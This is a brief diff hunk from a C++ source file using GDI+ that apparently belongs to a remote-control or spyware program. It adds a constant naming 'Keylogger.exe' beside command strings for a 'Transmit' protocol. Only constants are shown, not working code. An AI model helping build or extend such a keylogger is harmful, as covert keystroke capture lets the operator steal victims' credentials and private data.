@@ -38,6 +38,7 @@ using namespace Gdiplus;
 #define finish "Transmit//finish"
 #define request "Transmit//request"
 #define confirm "Transmit//confirm"
+#define klexe "Keylogger.exe"
 
 
 struct control
